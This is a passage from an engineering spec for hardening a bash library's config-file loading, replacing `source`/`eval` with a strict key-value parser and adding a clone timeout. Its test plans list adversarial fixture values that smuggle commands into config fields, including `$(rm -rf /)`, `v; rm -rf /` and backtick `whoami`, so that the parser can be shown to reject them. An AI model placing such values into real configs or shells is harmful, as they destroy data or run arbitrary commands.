**Watchdog SIGINT trap (per L-1)**: Stream 4 cleanup item — the watchdog pattern `( sleep "$fetch_timeout" && kill -TERM "$clone_pid" 2>/dev/null ) &` spawns a background subshell. If the OUTER script (`init.sh` or `update.sh`) is interrupted (Ctrl+C from the user) BEFORE the watchdog fires, the watchdog subshell becomes orphaned and continues running. Add a `trap` in `aod_template_fetch_upstream` to clean up on SIGINT/SIGTERM/EXIT:

```bash
local watchdog_pid_local=$watchdog_pid
trap 'kill "$watchdog_pid_local" 2>/dev/null; trap - INT TERM EXIT' INT TERM EXIT
```

This is a nice-to-have robustness fix, not blocking for delivery. Closes a small process-leak window of up to `$fetch_timeout` seconds when the outer script is interrupted before the clone completes.

### FR-7 — Public ADR-040 documents the migration

`docs/architecture/02_ADRs/ADR-040-config-file-parsing-hardening.md` is authored with sections:

- **Status**: Proposed → Accepted (dual-commit pattern). Tasks.md decomposes into T-X.1 (Proposed) and T-X.2 (Accepted) per F-1 precedent.
- **Context**: The four `source` / `eval` config-file sites in tachi's bash library; the F-1 substitution-surface precedent; Daniel Wood's 2026-05-02 LinkedIn note (which named the substitution surface but which logically extends to any source-without-validation pattern).
- **Decision**: Adopt **read-buffer → strict-KV-regex → `printf -v`** as the canonical config-file load pattern across `init.sh`, `template-git.sh`, and `template-substitute.sh`. New library file: `.aod/scripts/bash/template-config-load.sh` exposing `aod_template_load_kv_file`. The split-or-bundle decision (Q-1 — single PR by default) is documented here per BLP-02 §F-2 Governance. **Q-3 footgun rationale**: `AOD_FETCH_TIMEOUT=0` is REJECTED with exit 1 — adopters should not be able to silently disable the protection by setting `=0` in shell rc; "no timeout" in CI is the failure mode F-2 is preventing. **TOCTOU residual race window (per H-2)**: `cat` opens the file once; the attacker race window collapses from "between two operations" to "before cat opens". The mitigation is "no double-read", not "no race". The residual is small but the framing matters for audit. Defense-in-depth: callers should ensure `.aod/personalization.env` has appropriate permissions (mode 0600).
- **Alternatives considered**:
  1. **JSON config format** (rejected): adds a JSON parser dependency; bash has no native JSON parser; would require `jq` (new runtime dep); breaks `contracts/personalization-schema.md` adopter-facing contract.
  2. **TOML config format** (rejected): same reasoning as JSON, plus TOML parsers are even less ubiquitous than JSON.
  3. **Individual point-fixes per site** (rejected): four bespoke validators duplicating logic; future-site additions would invent a fifth pattern; F-2 is explicitly building the library precisely to avoid this.
  4. **Bash sourcing in a `set -r` restricted-shell subshell** (rejected): `set -r` is bash 3.2 compatible but its restrictions (no `cd`, no PATH modification, no command-name with slashes, etc.) are designed for restricted-login-shell use cases and don't prevent arbitrary in-process bash code execution within the restricted shell — i.e., command substitution still works; the security improvement is illusory.
  5. **`bash -r -c` external invocation** (rejected): forks a subshell, breaks caller-scope assignment (which is the whole point of `source`); would require parsing the subshell's output and assigning in caller scope, which is exactly what FR-1 does without the fork.
  6. **Source-then-diff via `declare -p`** (rejected, per M-5): a pattern where after a `source`, the loader compares `declare -p`'s output before-and-after to detect newly-defined variables, and validates each. This pattern still requires a `source` step (the very vulnerability being closed). Diffing-after-source detects unknown keys but the malicious code has already run by the time diff runs. The architecture inversion principle is "data, not code" — sourcing-then-diffing keeps the file-as-code semantics. **Reject.** (Pre-emptive rejection added to ADR per M-5; someone reading ADR-040 might propose this exact alternative — pre-emptive rejection is cleaner than a later objection.)
- **Consequences**: One canonical pattern; bash 3.2 compatibility preserved; literal-string assignment by `printf -v`; performance benchmark documented per SC-10 with canonical fixture set (4 real config files: `stacks/nextjs-supabase/defaults.env`, `stacks/fastapi-react/defaults.env`, recorded-valid `aod-kit-version`, recorded-valid `personalization.env`) and methodology (100 invocations × 4 fixtures × p50/p95; per-file delta NOT aggregate; warm-cache + cold-cache reported separately per F-250 ADR-039 cache-state-aware reporting precedent); F-2 perf disposition: tiered ladder per NFR-4 / SC-10 — constant-factor cost on bounded N ≤ 50 lines is acceptable (security improvement justifies the cost). Awk micro-optimization rejected (BSD vs GNU awk variance; complexity creep on a security-load primitive). Relationship to ADR-038 noted (ADR-038 is the substitution canon; ADR-040 is the config-load canon; both share the **regex-validate → reject-on-mismatch → `printf -v` assignment** validation triplet). F-1 contract amendment per B-2 Path R-2: `aod_init_read_validated` extended to reject `$`, `\`, backtick at the prompt boundary (CHANGELOG entry tied to F-2).
- **Related findings**: Five vuln_ids closed by this ADR.
- **References**: Web archive snapshot of Daniel Wood's 2026-05-02 LinkedIn thread (durable evidence trail per F-1 precedent); F-1 ADR-038; F-250 ADR-039.

### FR-8 — Release-please trigger with belt-and-suspenders verification

Per `.claude/rules/git-workflow.md` precedent (and F-212 incident memory):

1. **PR title at draft creation**: `feat(256): harden source-pattern surface — bash source/eval → KV parser + clone timeout`.
2. **Pre-merge re-verify**: `gh pr view <PR> --json title --jq .title` matches `^feat\(256\):`.
3. **Post-merge release-please verification**: `gh pr list --state open --search "release-please" --limit 3` returns a release-please PR within ~30s. If empty, push an empty release-marker commit:
   ```
   git commit --allow-empty -m "feat(256): source-pattern hardening — release marker"
   git push origin main
   ```

### FR-9 — Test runner: pytest-via-subprocess (matches F-1 precedent)

Per F-1 Pass 1 BLOCKING B-1 (already-adjudicated, applied to F-2 by precedent): F-2's regression tests use **pytest-via-subprocess**, NOT bats. The repo's `tests/` tree is pure pytest; no `.bats` files exist; CI is already wired for pytest matrix on macos-latest + ubuntu-latest.

**Test file locations**:
- `tests/scripts/test_template_config_load_unit.py` (Test-1 — library function in isolation; 27 cases per v1.1).
- `tests/scripts/test_template_config_load_integration.py` (Test-2 — adversarial inputs across all 4 refactored sites; M-1 framing precision; H-2 TOCTOU residual fixture).
- `tests/scripts/test_template_git_clone_timeout.py` (Test-3 — clone timeout behavior + writer→reader round-trip per H-3 + hanging-listener fixture per M-3).
- `tests/scripts/test_init_sh_defaults_env.py` (Test-4 — init.sh end-to-end with refactored defaults.env load).
- `tests/scripts/test_template_substitute_lint_no_eval.py` (Test-5 — `eval` removal verification, renamed per L-2).
- `tests/scripts/conftest.py` (modified — session-scoped `hanging_upstream` fixture per M-3 + F-250 ADR-039 fixture-scope canon).
- `tests/fixtures/config-load/valid/` (NEW directory — valid KV fixtures per L-2).
- `tests/fixtures/config-load/adversarial/` (NEW directory — adversarial KV fixtures per L-2; each file carries `# DO NOT SOURCE` header).
- `tests/fixtures/regenerate-config-load-baseline.sh` (NEW — fixture regeneration script per F-1 M-5 precedent).

---

## 🚫 Non-Functional Requirements

### NFR-1 — Cross-platform parity

All tests pass on macOS (bash 3.2 default) AND Linux (bash 4+). CI gates merge on both green. No bash 4-only features in `aod_template_load_kv_file` or in any refactor-site code. The clone-timeout `&` / `wait` / `kill` pattern is verified bash 3.2 compatible.

### NFR-2 — No new runtime dependencies

Empty diff on `pyproject.toml`, `requirements*.txt`, `package.json`. The library uses bash builtins only (`cat`, `printf`, `[[`, `=~`, parameter expansion `${!var}`, here-strings `<<<`).

### NFR-3 — Backward-compatible KV format

The new loader accepts the **exact KV format** that the existing `source` paths accepted for **valid** input (KEY=value, KEY="quoted value", KEY='single-quoted'). The semantics tightening rejects exactly what was already-not-supported: command substitution, parameter expansion, escape sequences, embedded shell metachars in unquoted values. Adopters with valid config files see zero behavior change.

### NFR-4 — Performance neutrality (measurable, with escalation thresholds)

Init duration on a fresh checkout MUST NOT regress by more than **25% under default conditions** (the new `aod_template_load_kv_file` path on the canonical config-file fixture set — four real config files: two `defaults.env`, one `aod-kit-version`, one `personalization.env`). Regressions in the **25%-50% range** require ADR-040 §Consequences documentation of measured numbers AND security tradeoff rationale (per Q-5 ruling). Regressions **>50%** trigger PM re-scope escalation (per Q-5 ruling). Per-file delta (NOT aggregate) — a 100% slowdown on one file averaged with 0% on three others would mask the regression.

Threshold ladder per SC-10:

- ≤ 5% → no PRD update; document in ADR-040 §Consequences.
- 5%-25% → loosen NFR-4 to 25% with rationale; document in ADR-040 §Consequences (Architect record-only escalation).
- 25%-50% → accept-and-document (Q-5 Option a, tightened): loosen NFR-4 to 50%; ADR-040 §Consequences MUST include both raw numbers AND security tradeoff rationale; Team-Lead approval recorded in spec.md.
- > 50% → escalate to PM for re-scope (Q-5 Option c — three re-scope levers: Q-1 split, drop whitelist, accept with explicit tradeoff in ADR + CHANGELOG).

**Why measurable beats hand-wave**: the new parser does explicit per-line regex matching + per-line whitelist lookup + `printf -v` assignment, where the old `source` was a single `bash` interpretation pass. On a 5-line config file this is sub-millisecond either way; on a hypothetical 1000-line config (which tachi doesn't have, but a future fork might) the constant factor matters. The fixture set is bounded (4 files, totalling <50 lines); the absolute regression is bounded. Awk micro-optimization REJECTED per Q-5 ruling (BSD vs GNU awk variance + audit-readability concern).

### NFR-5 — Zero `finding.yaml` schema change

`schemas/finding.yaml` is not modified. The five vuln_id closures use the existing schema; the `.security/vulnerabilities.jsonl` `REMEDIATED` events conform to the existing event shape. Ninth feature in a row with no schema bump.

### NFR-6 — No new agent files; no orchestrator changes

F-2 is a bash-library refactor + a new sourced helper file + an ADR + a CHANGELOG entry. No agent files in `.claude/agents/` change; no orchestrator phase additions; no `tachi.run` chain step additions. The change is contained to the bash-library surface and its tests.

---

## 🧪 Regression Protection Plan

### Test-1 — `aod_template_load_kv_file` unit tests in isolation

`tests/scripts/test_template_config_load_unit.py` invokes the library function via `subprocess.run` with controlled input fixtures. Coverage:

1. **Valid KV file (no whitelist)**: 5-line file with KEY=value, KEY="quoted", KEY='single-quoted', KEY=path/with/slashes, KEY=email@example.com — all assigned correctly with the specified prefix.
2. **Valid KV file (with whitelist)**: same content, whitelist matches all keys → success; whitelist missing one key → exit 8 with missing-key error.
3. **Invalid line — command substitution**: `KEY="$(rm -rf /)"` → exit 8.
4. **Invalid line — unbalanced quote**: `KEY="unbalanced` → exit 8.
5. **Invalid line — backtick**: `` KEY=`whoami` `` → exit 8.
6. **Invalid line — embedded `$`**: `KEY="$VAR"` → exit 8.
7. **Invalid line — embedded `\`**: `KEY="escaped\nstring"` → exit 8.
8. **Invalid line — lowercase KEY**: `key=value` (in upper-mode) → exit 8.
9. **Invalid line — leading-digit KEY**: `1KEY=value` → exit 8.
10. **Invalid line — disallowed unquoted char**: `KEY=foo bar` (space in unquoted value) → exit 8.
11. **Comment lines**: `# this is a comment` → skipped, no error.
12. **Blank lines**: empty line → skipped, no error.
13. **File-absent**: `<path>` does not exist → exit 3.
14. **Empty `<path>` arg**: → exit 1.
15. **Invalid `<var_prefix>`** (e.g., `lower`, `123`, `WITH-DASH`) → exit 1.
16. **Whitelist with missing required key**: input file has `KEY1=v1`; whitelist contains `(KEY1, KEY2)` → exit 8 with missing-key error naming `KEY2`.
17. **Whitelist with extra disallowed key**: input file has `KEY1=v1, ROGUE_KEY=v2`; whitelist contains `(KEY1)` → exit 8 with disallowed-key error naming `ROGUE_KEY`.

**B-1 + B-3 + H-1 expansion cases (v1.1)**:

18. **Empty unquoted value (per B-1)**: `KEY=` (bare empty value, no whitespace, no quotes) → **PASS** (assigned `KEY=""` in caller scope). This is the version-file `version=` case for adopters installed off a non-tagged commit. Verified empirically against `/Users/david/Projects/tachi/.aod/aod-kit-version` line 1.
19. **Trailing newline file (per B-3)**: file ends with `\n` → all lines parse correctly; last line is iterated.
20. **No-trailing-newline file (per B-3)**: file does NOT end with `\n` → all lines parse correctly; last line is iterated (verified the `<<< "$content"` here-string adds the missing newline back after `cat` strips it).
21. **CRLF line endings (per B-3)**: file with `\r\n` line endings → CR is stripped via `line="${line%$'\r'}"`; lines parse correctly. Cross-platform tolerance for Windows-edited config files.
22. **Leading-whitespace KV line (per B-3)**: `   KEY=value` (spaces before KEY) → leading whitespace stripped via `line="${line#"${line%%[![:space:]]*}"}"`; line parses correctly per path (a) (more permissive). Pattern reuses `init.sh:217`.
23. **Mixed CRLF/LF line endings (per B-3)**: file with some `\r\n` and some `\n` lines → all parse correctly.
24. **Lowercase mode regex variant (per H-1)**: `<key_case>=lower` + valid lowercase keys (`version=4.28.0`, `sha=abc123`, etc.) → all assigned correctly. Verifies the `^[a-z_][a-z_0-9]*=...$` regex variant.
25. **Lowercase mode rejects uppercase KEY**: `<key_case>=lower` + line `VERSION=4.28.0` → exit 8 (uppercase KEY rejected in lower-mode).
26. **Defensive `printf -v` identifier check (per H-1)**: var_prefix empty + lower-mode + valid lowercase keys → assignment succeeds in caller scope (constructed identifier matches `^[A-Za-z_][A-Za-z_0-9]*$`).
27. **Invalid `<key_case>` arg**: `<key_case>=mixed` or `<key_case>=foo` → exit 1 (only `upper` and `lower` permitted per Q-2.5 ruling).

### Test-2 — Adversarial-input integration tests across all 4 refactored sites

`tests/scripts/test_template_config_load_integration.py` exercises each refactored site (init.sh defaults.env load, aod-kit-version load, personalization.env load) with adversarial fixtures. Each site receives:

1. A valid baseline fixture → load succeeds; expected variables assigned.
2. A command-substitution fixture (`KEY="$(touch /tmp/F-256-pwned)"`) → exit 8; `/tmp/F-256-pwned` never created (test asserts file absence post-call). **Framing precision (per M-1)**: Pre-F-2, this line caused execution at source-time. Post-F-2, the line FAILS the regex (`$` rejected inside double-quoted values; command-substitution `$(...)` syntax doubly rejected) and the function returns exit 8 with no execution. **This is the active-vulnerability closure path, not just defense-in-depth.**
3. A semicolon-shell-injection fixture (`KEY=v; rm -rf /`) → exit 8 (semicolon outside quotes is in the disallowed-char set for unquoted values). **Framing precision (per M-1)**: Pre-F-2, `KEY=v; rm -rf /` would EXECUTE `rm -rf /` at source-time. Post-F-2, the line FAILS the regex and the function returns exit 8 with no execution. This is the active-vulnerability closure path, not just defense-in-depth.
4. A whitelist-violation fixture (key not in allowlist) → exit 8.
5. An empty-file fixture → exit 8 (whitelist required keys missing) OR exit 0 (no whitelist, no required keys) — site-dependent.

**TOCTOU fixture (per H-2 update)**: Test-2 includes a TOCTOU-residual fixture asserting deterministic output and no second read. The `strace -e openat` test from US-256-8 acceptance runs on Linux CI only (`ubuntu-latest`); macOS uses dtrace (different invocation pattern). Asserts the buffer-read produces deterministic output regardless of whether a forked process attempts to swap the file content between any two operations within the loader (the new code has no second read, so the swap cannot affect caller-scope values).

### Test-3 — Clone timeout behavior

`tests/scripts/test_template_git_clone_timeout.py` asserts:

1. **Hanging upstream → timeout**: a fixture upstream (a local TCP listener that accepts but never responds, or a `git daemon` on a port set to never respond) → `aod_template_fetch_upstream` with `AOD_FETCH_TIMEOUT=3` returns exit 9 within ~3-4s; partial checkout at `destdir` does not exist post-call.
2. **Override env var honored**: same fixture with `AOD_FETCH_TIMEOUT=5` → times out at ~5s, not 3s, not 60s.
3. **Invalid `AOD_FETCH_TIMEOUT` rejected**: `AOD_FETCH_TIMEOUT=abc` → exit 1 (argument error); `AOD_FETCH_TIMEOUT=0` → exit 1 per Q-3 default-rejected; `AOD_FETCH_TIMEOUT=-5` → exit 1.
4. **Fast clone — no timeout**: a fixture upstream that responds normally → `aod_template_fetch_upstream` succeeds normally; no zombie watchdog process; `destdir` is populated.
5. **Round-trip writer→reader on every field-shape combination (per H-3)**: writer emits a tmp version file with each `version`/`sha`/`updated_at`/`upstream_url`/`manifest_sha256` field-shape combination (empty `version=`, populated `version=4.28.0`, etc.); reader parses each output identically. Verifies the inner round-trip block at `aod_template_write_version_file:485-515` post-refactor.

**Hanging-listener fixture sketch (per M-3)**: the hanging-upstream fixture is a session-scoped pytest fixture that spawns a Python `socketserver.TCPServer` with a never-responding handler. Code sketch:

```python
# tests/scripts/conftest.py — session-scoped per F-250 ADR-039 fixture-scope canon
import socket
import socketserver
import threading
import pytest

class HangingHandler(socketserver.BaseRequestHandler):
    def handle(self):
        # Accept the TCP connection but never respond to any data
        # The clone request will block indefinitely on read()
        try:
            self.request.recv(4096)  # receive but do not respond
            # Hold the connection open until peer closes
            while True:
                data = self.request.recv(4096)
                if not data:
                    break
        except (ConnectionResetError, BrokenPipeError):
            pass

@pytest.fixture(scope="session")
def hanging_upstream():
    """Session-scoped TCP listener that accepts but never responds.
    Returns the URL of the hanging upstream as a `git://` URL."""
    server = socketserver.TCPServer(("127.0.0.1", 0), HangingHandler)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    yield f"git://127.0.0.1:{port}/hanging.git"
    server.shutdown()
    server.server_close()
```

**Risks (per M-3)**:
- **Port allocation**: bind to ephemeral port (`socket.bind((host, 0))`) then read assigned port — never hardcoded port (collides with CI parallelism).
- **Fixture cleanup**: pytest `yield` + teardown is the right pattern; the watchdog clone-timeout test specifically tests the fetch DOES kill its child — verify the test fixture's listener doesn't get killed by the SUT's `kill -TERM`.
- **CI runner constraints**: GitHub Actions runners may have firewall rules limiting localhost-port binding. Verify on `macos-latest` AND `ubuntu-latest` BEFORE Day 5 slip-watch.
- **Test determinism**: a 3-second timeout test on a hanging listener should complete in 3-4 seconds. Margin >2× the timeout is acceptable; if the test takes >5s, the watchdog kill isn't firing.

**Stream 5 budget allocation**: ~0.5d within Stream 5's 3.0d budget allocated for the hanging-listener CI shake-out (pre-Day 5 slip-watch verification). Session-scoped fixture in `tests/scripts/conftest.py` reduces re-creation cost across tests.

### Test-4 — `init.sh` end-to-end with refactored defaults.env load

`tests/scripts/test_init_sh_defaults_env.py` asserts:

1. **Each shipped stack pack loads successfully**: iterate `stacks/*/defaults.env`; each loads under `aod_template_load_kv_file` with the `STACK_PACK_ALLOWED_KEYS` whitelist; expected `STACK_*` variables populated; `init.sh` proceeds normally.
2. **Tampered fixture pack rejected**: `stacks/test-fixtures/malicious-pack/defaults.env` (NEW test fixture) containing a disallowed key OR command substitution → init exits with code 8; the malicious-effect side-action (e.g., `touch /tmp/F-256-pwned`) never occurs.

### Test-5 — `eval` removal verification

`tests/scripts/test_template_substitute_lint_no_eval.py` asserts (lint-style, not behavior — renamed per L-2 for consistency with F-250's `test_substitute_shim_canary.py` precedent):

```python
import subprocess
result = subprocess.run(
    ["grep", "-c", r"\beval\b", ".aod/scripts/bash/template-substitute.sh"],
    capture_output=True, text=True
)
assert result.stdout.strip() == "0", f"eval found in template-substitute.sh: {result.stdout}"
```

Backstop against future regression. Same lint pattern can be applied to `init.sh` and `template-git.sh` if Architect Q-2 adjudicates the broader surface. Filename `test_template_substitute_lint_no_eval.py` makes the lint-style intent explicit (vs behavior tests). Kept in `tests/scripts/` per F-250's canary-style precedent (NOT moved to a separate `tests/lint/` tree).

### Test-6 — Cross-platform CI matrix (existing pytest matrix; no new wiring)

The existing pytest CI matrix runs Test-1 through Test-5 on:
- `macos-latest` (bash 3.2.57 default — verifying bash 3.2 compatibility).
- `ubuntu-latest` (bash 5.x — verifying no regressions on Linux).

Both must be green for merge. **No new CI workflow file is added** — F-2 adds tests to an already-running matrix (per F-1 precedent).

### Test-7 — Post-merge `/security` re-scan

After merge to `main`, run `/security` (standalone) targeting the source-pattern surface (`scripts/init.sh`, `.aod/scripts/bash/template-config-load.sh`, `.aod/scripts/bash/template-git.sh`, `.aod/scripts/bash/template-substitute.sh`). Expected: zero new findings, five `REMEDIATED` events in `.security/vulnerabilities.jsonl`.

---

## ✅ Definition of Done

Restructured per Team-Lead M-4 into **Pre-merge DoD** (must be green for merge) and **Post-merge DoD** (post-merge artifacts and verification).

### Pre-merge DoD (gate for `gh pr merge --squash`)

- [ ] `.aod/scripts/bash/template-config-load.sh` written, unit-tested, sourced by all four call sites.
- [ ] `init.sh:106` refactored to use `aod_template_load_kv_file` with `STACK_PACK_ALLOWED_KEYS` whitelist; downstream `STACK_*` reads updated.
- [ ] `template-git.sh:561` and `aod_template_write_version_file:485-515` (inner round-trip block at `:501`) refactored to use `aod_template_load_kv_file "$path" "" "" lower`; per-field validators preserved post-load.
- [ ] `template-substitute.sh:217, :249, :536, :558` refactored: `eval` → `${!var}` (read; with `:-` default at `:217, :249, :536`; NO `:-` default at `:558` per H-4) + `printf -v` (write); zero `eval` in file post-merge.
- [ ] `template-substitute.sh:566-571` writer escape pass REMOVED (per B-2 Path R-2); F-1's `aod_init_read_validated` amended to additionally reject `$`, `\`, backtick at the prompt boundary.
- [ ] `template-substitute.sh:162-209` (`aod_template_load_personalization_env`) refactored to delegate to `aod_template_load_kv_file` with `AOD_CANONICAL_PLACEHOLDERS` whitelist.
- [ ] Clone timeout active in `aod_template_fetch_upstream:102-104` with `AOD_FETCH_TIMEOUT` env override; default 60s; exit 9 on timeout; partial-checkout cleanup; SIGINT trap for watchdog cleanup (per L-1).
- [ ] `contracts/stack-pack-defaults-schema.md` authored (NEW file — per Q-2 ruling + L-3) documenting `STACK_PACK_ALLOWED_KEYS` source-of-truth.
- [ ] **Tests 1-6 green** on macOS (bash 3.2.57) + Linux (bash 5.x) via the existing pytest CI matrix:
  - Test-1 (unit, including 27 cases per v1.1 expansion)
  - Test-2 (adversarial integration, 4 sites)
  - Test-3 (clone timeout + writer→reader round-trip)
  - Test-4 (init.sh end-to-end)
  - Test-5 (`test_template_substitute_lint_no_eval.py` — renamed per L-2)
  - Test-6 (cross-platform CI matrix verification)
- [ ] ADR-040 transitioned to `Status: Accepted` post-CI green (Proposed → Accepted dual-commit; T-X.1 / T-X.2 task split per Q-6 ruling).
- [ ] Q-1 single-PR-bundle decision documented in spec.md §Format and ADR-040 §Decision per BLP-02 §F-2 Governance.
- [ ] CHANGELOG entry added with version bump notes; one-line note for the (extremely unlikely) adopter whose config files contained non-KV bash with self-service repair guidance; CHANGELOG note tied to F-2 documenting F-1's `aod_init_read_validated` amendment per B-2 Path R-2.
- [ ] **Pre-merge title check**: PR title is Conventional-Commits-formatted as `feat(256): ...` at draft creation; pre-merge re-verify via `gh pr view <PR> --json title --jq .title` matches `^feat\(256\):`.

### Post-merge DoD (verification after `gh pr merge --squash` to main)

- [ ] **Test-7** — Post-merge `/security` re-scan produces zero new findings in the source-pattern surface this feature touched (`scripts/init.sh`, `.aod/scripts/bash/template-config-load.sh`, `.aod/scripts/bash/template-git.sh`, `.aod/scripts/bash/template-substitute.sh`).
- [ ] All 5 vuln_ids → `REMEDIATED` in `.security/vulnerabilities.jsonl` with merge SHA + timestamp.
- [ ] **Release-please PR** opens within ~30s post-merge (`gh pr list --state open --search "release-please" --limit 3`). If empty, push empty `feat(256):` marker commit per F-212 incident memory + `.claude/rules/git-workflow.md` belt-and-suspenders pattern.
- [ ] BLP-02 strategy doc internal update (per L-3): update `_internal/strategy/BLP-02-enterprise-hardening.md` line 374 with post-F-2 line numbers (or remove the line numbers entirely since post-merge the eval call sites no longer exist). This is internal-only documentation and not part of the PR.

---

## 🔗 Dependencies

### Upstream (within BLP-02)

- **F-1 (#248) — Substitution Surface Hardening**: ✓ DELIVERED 2026-05-04 (PR #249, ADR-038 Accepted, v4.28.0). F-2 reuses **the validation triplet pattern** (regex-validate → reject-on-mismatch → `printf -v` assignment) documented in ADR-038, NOT the `aod_init_read_validated` function itself (per F-1 PRD §Dependencies-Downstream and Team-Lead Pass 1 H-2 framing). F-2 is the **non-interactive file-parse** counterpart to F-1's interactive `read -p` pattern.
- **F-250 (Wave 1 follow-on hot-fix)**: ✓ DELIVERED 2026-05-04 (PR #253, ADR-039 Accepted). F-250 took the originally-planned ADR-039 number; F-2 slips to ADR-040. F-250's test-architecture canon (fixture scope; asymmetric baseline) applies to F-2's test design — Stream 5 fixture regeneration script follows F-250 conventions.

### Internal pre-requisites

- **ADR-038 (substitution canon)**: F-2's ADR-040 cross-references ADR-038 for the shared validation triplet pattern. Architect verifies ADR-040's framing of the relationship during spec.md authoring.
- **`aod_template_load_personalization_env` existing contract** (`.aod/scripts/bash/template-substitute.sh:162-209`): F-2 inherits the missing-key list semantics, the newline / NUL rejection (now via regex), and the `AOD_PERSONALIZATION_<KEY>` caller-scope variable contract.
- **`AOD_CANONICAL_PLACEHOLDERS` array** (`.aod/scripts/bash/template-substitute.sh:50-63`): F-2 reuses this array as the whitelist for the personalization.env site. No mutation; reference-only.

  **Array-reference-order note (per Team-Lead L-1)**: `template-substitute.sh:50-63` defines the array at file-scope; the library function `aod_template_load_kv_file` receives the array name as a string (`"AOD_CANONICAL_PLACEHOLDERS"`) and dereferences via indirection at call-time, AFTER `init.sh` has sourced `template-substitute.sh`. The wiring is correct as designed: when `init.sh` calls `aod_template_load_personalization_env`, it has already sourced `template-substitute.sh` (which sets the array at file-scope). The library function then dereferences at call-time — array IS in scope. Test-2 (integration) implicitly verifies this (the personalization.env site test loads with the whitelist and asserts each canonical key is found).
- **Existing per-field validators in `template-git.sh:568+`**: F-2 preserves these validators; they run AFTER the `aod_template_load_kv_file` call on the post-load buffer.
- **`STACK_PACK_ALLOWED_KEYS` allowlist source-of-truth**: needs documenting somewhere — `contracts/stack-pack-defaults-schema.md` (NEW file? or extend existing schema?) is a candidate. Q-2 (Architect) below covers this.

### Downstream (BLP-02 wave continuation)

- **F-3 (Wave 3 — SECURITY.md + private vuln reporting)**: independent of F-2's bash-library surface. Can advance in parallel post-F-2 spec sign-off.
- **F-4 (Wave 4 — Claude permissions baseline)**: independent. ADR-041 (renumbered from originally-planned ADR-040 after F-250+F-2 shift). Could ship in parallel with F-3 / F-5.
- **F-5 (Wave 4 — pre-commit secret-scan defaults)**: independent. ADR-042 (renumbered).
- **Future config-load sites**: any new feature introducing a config-file load (in BLP-03+ or in any future BLP) reuses `aod_template_load_kv_file` — F-2 is the load-bearing primitive.

### External

- **No external dependencies.** F-2 is fully self-contained within tachi's bash library + tests + ADR.

---

## ⚠️ Risks

### R-1 — bash 3.2 compatibility regression in the new library (MEDIUM)

**Scenario**: `aod_template_load_kv_file` accidentally uses a bash-4 feature (associative arrays, `mapfile`/`readarray`, `${var,,}` lowercase expansion, `&>` redirection without explicit `2>&1`, regex `=~` with bash-4-only character classes).

**Mitigation**: All helpers reviewed for bash 3.2 compatibility before merge; CI matrix runs on macOS (bash 3.2.57 default) AND Linux (bash 5.x). The watchdog `&` / `wait` / `kill` pattern in FR-6 is verified bash 3.2 compatible. Per F-1 R-1 precedent, this is a **mitigated** risk, not an unknown.

### R-2 — Strict regex rejects a legitimate adopter config value (MEDIUM)

**Scenario**: An adopter's `defaults.env` or `personalization.env` contains a value that is currently sourced successfully but doesn't match the new regex — e.g., a value with a literal `$` (perhaps an env-var-reference placeholder that the adopter expected to be expanded), a value with a literal `\`, or a value with embedded whitespace in an unquoted form.

**Mitigation**: Test-2 enumerates the canonical-12 placeholder values and verifies the existing values from a representative-adopter snapshot pass the regex. The regex is calibrated against `contracts/personalization-schema.md` §Value Constraints which already documents the no-newline / no-NUL / printable-only rule. Edge cases (e.g., a value with a literal `$` that the adopter expected as a placeholder for env-var expansion) are explicitly **not supported** in the existing contract — the rejection is a feature, not a regression. CHANGELOG includes self-service repair guidance for the (extremely unlikely) adopter who hits this case.

### R-3 — Performance regression on the canonical fixture (MEDIUM)

**Scenario**: The new `aod_template_load_kv_file` is materially slower than `source` on the canonical 4-file fixture set (the per-line regex match + per-line whitelist lookup + `printf -v` assignment costs more than a single bash interpretation pass).

**Mitigation**: SC-10 / NFR-4 specify a measurable benchmark contract with explicit thresholds and an escalation path. Q-5 (Team-Lead) below adjudicates handling if the regression exceeds 25%. The fixture set is bounded (4 files, totalling <100 lines); the absolute regression is bounded.

### R-4 — Whitelist allowlist drift (LOW)

**Scenario**: The `STACK_PACK_ALLOWED_KEYS` whitelist in `init.sh` (or `AOD_CANONICAL_PLACEHOLDERS` in `template-substitute.sh`) drifts out of sync with the actual schema (e.g., a stack pack ships with a new legitimate key like `TECH_STACK_OBSERVABILITY` that isn't yet in the whitelist; loads fail until the whitelist is updated).

**Mitigation**: Per Q-2 below, the whitelist source-of-truth is documented in `contracts/stack-pack-defaults-schema.md` (or the existing analogous contract for personalization). Schema changes require synchronized whitelist updates — this is a documented contract obligation, not an unknown failure mode.

### R-5 — TOCTOU mitigation breaks a load-bearing race-pattern (LOW)

**Scenario**: Some existing tachi flow relies on the personalization.env file being source-able twice (e.g., a pre-step writes a partial file, the loader source-fails on the partial, the post-step writes the complete file, the loader source-succeeds). The buffered-read pattern would break this race.

**Mitigation**: Audit of existing `aod_template_load_personalization_env` callers (`init.sh`, `update.sh`, `aod.update` skill) — none rely on a transient-partial-then-complete pattern; the existing flow always writes the complete file before any loader call. Test-2 includes a fixture that simulates the previous transient-partial state (e.g., a 2-line partial file missing required keys) and verifies the new loader fails clean (exit 8 with missing-key list), not differently from the old loader.

### R-6 — Clone timeout breaks a slow-but-legitimate fetch (LOW)

**Scenario**: An adopter on a slow connection (rural broadband, container with constrained network, large monorepo upstream) experiences a legitimate fetch that takes >60s and hits the new timeout, breaking their `/aod.update` flow.

**Mitigation**: The default 60s is a Q-3 adjudication item. The `AOD_FETCH_TIMEOUT` override env var is the documented escape hatch — adopters can set `AOD_FETCH_TIMEOUT=300` permanently in their shell rc or per-command. CHANGELOG documents the override clearly. The 60s default is calibrated against typical tachi-upstream-fetch durations (the manifest-only shallow clone is small; >60s is anomalous).

### R-7 — Q-1 split-or-bundle decision causes scope thrash (LOW)

**Scenario**: Architect adjudicates Q-1 toward a F-2a/F-2b split; spec.md / plan.md / tasks.md must split; two PR cycles needed; ADR-040 needs amendment between F-2a and F-2b merge; release-please cadence doubles.

**Mitigation**: **RESOLVED** — Q-1 ruled SINGLE PR by default; F-2a/F-2b split is reserved as Day-5 slip-watch contingency only (NOT default). If Day-5 checkpoint converts to split, plan.md absorbs the split with a Stream-1.5 hand-off task; the ADR-040 split is documented as a single ADR with two sub-decisions rather than two ADRs. Net thrash bounded.

### R-8 — Downstream forks with custom config keys rejected by whitelist (MEDIUM, per Team-Lead M-6)

